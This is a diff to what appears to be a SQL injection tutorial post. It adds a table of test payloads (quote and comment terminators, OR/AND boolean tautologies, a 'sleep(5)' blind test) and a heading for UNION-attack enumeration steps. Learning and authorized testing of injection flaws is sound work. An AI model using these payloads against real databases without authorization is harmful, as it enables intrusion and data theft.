@@ -620,7 +620,25 @@ To summarize the post:
 3. Send SQL specific characters to cause an error in the query generation that will lead to database causing an error. 
 4. Look for changes in the webpage of error per parameter/input test
 
-UNION attack checklist:
+**Testing checklist**:
+
+| Name | Character | Function |
+| ------ | ----------- | ---------- |
+| Single quote | `'` | String terminator |
+| Semi colon | `;` | Query terminator
+| Comment | `-- -` | Removing rest of the query |
+| Single quote with a comment | `'-- -` | End a string and remove rest of the query |
+| Single quote, semi colon and a comment | `';-- -` | End a string, end query, and remove rest of the query |
+| OR operator | `OR 1=1-- -` | For integers, `true` test |
+| OR operator | `OR 1=2-- -` | For integers, `false` test |
+| OR operator | `' OR '1'='1'-- -` | For strings, `test` test |
+| AND operator | `AND 1=1-- -` | For integers, `true` test |
+| AND operator | `AND 1=2-- -` | For integers, `false` test |
+| AND operator | `' AND '1'='1'-- -` | For strings, `true` test |
+| Sleep function | `OR sleep(5)-- -` | Blind test |
+
+
+**UNION attack hack steps**:
 1. Use mixed case in case of some filtering
 2. Use "ORDER BY" to get the number of columns
 3. Find printable columns
